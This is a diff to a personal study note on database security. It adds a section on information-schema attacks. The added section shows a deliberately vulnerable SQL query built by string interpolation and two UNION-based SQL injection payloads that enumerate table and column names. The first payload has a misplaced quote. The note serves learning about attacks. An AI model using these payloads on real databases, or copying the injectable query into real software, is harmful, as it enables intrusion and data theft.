@@ -1,7 +1,7 @@
 ---
 related to:
 created: 2025-11-29, 16:22
-updated: 2025-11-30T11:08
+updated: 2025-11-30T11:23
 completed: false
 ---
 # database security
@@ -122,4 +122,23 @@ the comment symbols used are:
 - `#` (single-line comment, mySQL only)
 - `/* ... */` (multi-line comment)
 #### information schema attacks
-*INFORMATION*
+*information schemas* are metadata about the objects within a database. they can be used to gather data about any tables from the available databases. they store:
+- what databases exist
+- what tables exist in each database
+- what columns exist in each table
+- the privileges granted to users
+information schemas are attacked to gather infomation about the DB structure
+>[!example]
+
+```SQL
+-- vulnerable query
+$q = "SELECT username FROM users WHERE user id=$id";
+
+-- step 1: get the table's name
+$id = "- 1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema != "'mysql' AND table_schema != 'information_schema' -- ";
+
+-- step 2: get the name of the columns inside the tables
+$id = "-1 UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users' LIMIT 0,1 --";
+
+-- using '-1' as the ID makes the query result for the original query to be empty, forcing the db to rely on the results of the UNION SELECT
+```
